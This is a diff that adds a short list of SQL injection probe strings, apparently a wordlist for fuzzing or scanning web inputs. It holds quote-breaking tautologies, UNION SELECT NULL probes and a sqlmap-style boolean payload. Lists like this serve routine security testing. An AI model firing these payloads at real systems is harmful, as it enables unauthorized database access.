@@ -1,0 +1,7 @@
+' OR '1'='1
+' AND '1'='2
+' UNION SELECT NULL--
+" OR "1"="1
+" AND "1"="2
+" UNION SELECT NULL--
+id=7' AND 7793=7793 AND 'wMPu'='wMPu
